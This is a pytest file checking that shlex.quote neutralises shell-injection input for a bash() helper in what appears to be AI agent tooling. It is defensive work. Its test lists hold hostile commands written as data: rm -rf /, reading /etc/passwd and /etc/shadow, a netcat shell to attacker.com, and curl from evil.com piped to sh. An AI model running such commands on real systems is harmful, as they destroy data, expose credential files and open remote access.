"""Tests for bash command escaping.

Phase 22: Security hardening for bash() function with shlex.quote escaping.
"""
import shlex
import pytest


class TestBashEscaping:
    """Tests for bash command escaping with shlex.quote."""

    def test_shlex_quote_prevents_injection(self):
        """shlex.quote prevents command injection."""
        malicious = "file; rm -rf /"
        quoted = shlex.quote(malicious)
        assert quoted == "'file; rm -rf /'"
        assert ";" not in quoted or quoted.startswith("'")

    def test_special_characters_quoted(self):
        """Special shell characters are properly quoted."""
        test_cases = [
            ("$HOME", "'$HOME'"),
            ("`whoami`", "'`whoami`'"),
            ("$(cat /etc/passwd)", "'$(cat /etc/passwd)'"),
            ("foo && bar", "'foo && bar'"),
            ("foo | bar", "'foo | bar'"),
        ]
        for input_str, expected in test_cases:
            assert shlex.quote(input_str) == expected

    def test_bash_function_with_args_parameter(self):
        """bash() function with args parameter escapes properly."""
        from scripts.agentica.claude_scope import create_claude_scope
        import tempfile

        with tempfile.TemporaryDirectory() as tmp:
            scope = create_claude_scope(project_dir=tmp)
            bash_fn = scope.get("bash")

            # Verify bash function exists and has args parameter
            import inspect
            sig = inspect.signature(bash_fn)
            assert "args" in sig.parameters, "bash() should have 'args' parameter"

    def test_bash_args_are_quoted(self):
        """Arguments passed via args are shlex.quoted."""
        from scripts.agentica.claude_scope import create_claude_scope
        import tempfile

        with tempfile.TemporaryDirectory() as tmp:
            scope = create_claude_scope(project_dir=tmp)
            bash_fn = scope.get("bash")

            # The function should accept args parameter
            # We can't test execution without Claude CLI, but we can test the signature
            import inspect
            sig = inspect.signature(bash_fn)
            params = list(sig.parameters.keys())
            assert "command" in params
            assert "args" in params

    def test_bash_builds_correct_command_with_args(self):
        """bash() correctly builds command with quoted args."""
        from scripts.agentica.claude_scope import create_claude_scope
        import tempfile

        with tempfile.TemporaryDirectory() as tmp:
            scope = create_claude_scope(project_dir=tmp)
            bash_fn = scope.get("bash")

            # Get the _build_bash_command helper if exposed for testing
            # Otherwise we test via the full command string in operation log
            # For now, verify the signature accepts args
            import inspect
            sig = inspect.signature(bash_fn)

            # Verify args has correct type annotation
            args_param = sig.parameters.get("args")
            assert args_param is not None, "bash() must have 'args' parameter"

            # Check default is None (optional parameter)
            assert args_param.default is None, "args should default to None"

    def test_empty_args_list_handled(self):
        """bash() handles empty args list correctly."""
        from scripts.agentica.claude_scope import create_claude_scope
        import tempfile

        with tempfile.TemporaryDirectory() as tmp:
            scope = create_claude_scope(project_dir=tmp)
            bash_fn = scope.get("bash")

            import inspect
            sig = inspect.signature(bash_fn)

            # Should have args parameter
            assert "args" in sig.parameters

    def test_shlex_quote_edge_cases(self):
        """shlex.quote handles edge cases correctly."""
        # Empty string gets quoted
        assert shlex.quote("") == "''"

        # String with only spaces gets quoted
        assert shlex.quote("   ") == "'   '"

        # Single quotes inside are escaped
        result = shlex.quote("it's a test")
        assert "'" in result  # Should contain escaped quote

        # Newlines are quoted
        assert shlex.quote("line1\nline2") == "'line1\nline2'"

    def test_dangerous_patterns_neutralized(self):
        """Common injection patterns are neutralized by quoting."""
        dangerous = [
            "$(reboot)",
            "`shutdown now`",
            "; cat /etc/shadow",
            "| nc attacker.com 4444",
            "&& curl evil.com/shell.sh | sh",
            "|| rm -rf --no-preserve-root /",
            "foo\nbar",  # Newline injection
            "foo\rbar",  # Carriage return injection
        ]

        for payload in dangerous:
            quoted = shlex.quote(payload)
            # All dangerous chars should be inside single quotes
            # which neutralizes them
            assert quoted.startswith("'") or not any(
                c in quoted for c in [";", "|", "&", "$", "`", "\n", "\r"]
            ), f"Payload not properly quoted: {payload!r} -> {quoted!r}"
